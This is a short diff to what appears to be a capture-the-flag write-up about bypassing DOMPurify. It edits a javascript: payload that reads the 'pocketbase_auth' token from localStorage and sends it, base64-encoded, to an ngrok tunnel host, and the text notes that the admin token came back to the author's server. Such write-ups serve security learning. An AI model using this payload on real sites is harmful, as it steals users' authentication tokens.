@@ -114,7 +114,7 @@ The DOMPurify library was on a stable version and finding a 0-day in this labele
 the base64 is just:
 
 ```javascript
-javascript:fetch('http://2.tcp.eu.ngrok.io:10030/'+btoa(localStorage.getItem(\"pocketbase_auth\")), { mode: 'no-cors'})
+javascript:fetch('http://2.tcp.eu.ngrok.io:10030/'+btoa(localStorage.getItem("pocketbase_auth")), { mode: 'no-cors'})
 ```
 
 Surely after reporting my image, I get back the admin token in my flask server:
